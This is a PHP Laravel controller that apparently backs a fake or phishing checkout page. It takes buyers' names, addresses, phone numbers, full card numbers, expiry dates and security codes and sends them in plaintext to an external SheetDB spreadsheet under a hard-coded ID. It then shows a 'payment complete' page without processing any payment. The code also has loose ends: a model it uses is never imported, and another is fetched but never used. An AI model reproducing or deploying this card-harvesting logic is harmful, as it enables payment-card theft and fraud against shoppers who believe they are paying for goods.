<?php

namespace App\Http\Controllers;

use SheetDB\SheetDB;
use Illuminate\Http\Request;
use App\Models\PixelModel;

class PostController extends Controller
{

    public function store(Request $request)
    {
        $sheetdb = new SheetDB('bw2b9oje4zqdw');
        $actualPixel = PixelModel::first();
        $sheetdb->create([
            'date'                      => date('d-m-Y H:i:s'),
            'emailAddress'              => $request->input('emailAddress'),
            'shipFirstName'             => $request->input('shipFirstName'),
            'shipLastName'              => $request->input('shipLastName'),
            'shipAddress1'              => $request->input('shipAddress1'),
            'shipAddress2'              => $request->input('shipAddress2'),
            'shipCity'                  => $request->input('shipCity'),
            'shipCountry'               => $request->input('shipCountry'),
            'shipState'                 => $request->input('shipState'),
            'shipPostalCode'            => $request->input('shipPostalCode'),
            'phoneNumber'               => $request->input('phoneNumber'),
            'billShipSame'              => $request->input('billShipSame'),
            'firstName'                 => $request->input('firstName'),
            'lastName'                  => $request->input('lastName'),
            'address1'                  => $request->input('address1'),
            'address2'                  => $request->input('address2'),
            'city'                      => $request->input('city'),
            'state'                     => $request->input('state'),
            'postalCode'                => $request->input('postalCode'),
            'payment_method'            => $request->input('payment_method'),
            'cardNumber'                => $request->input('cardNumber'),
            'cardDate'                  => $request->input('cardDate'),
            'cardSecurityCode'          => $request->input('cardSecurityCode'),
            'product_name'              => $request->input('product_name'),
            'product_quantity'          => $request->input('product_quantity'),
            'product_price'             => $request->input('product_price'),
            'subtotal_dolar'            => $request->input('subtotal_dolar'),
            'product_shipping'          => $request->input('product_shipping'),
            'total_dolar'               => $request->input('total_dolar'),
            'client_ip'                 => $request->ip()
        ]);

        $productlink_id = $request->get('productlink_id');
        $productlink = ProductLinkModel::find($productlink_id);

        if($request->input('language') == "spanish"){
            return view('productlink.paymentcompletespanish',['productlink'=>$productlink]);
        }
        else{
            return view('productlink.paymentcompletenglish',['productlink'=>$productlink]);
        }            
    }
}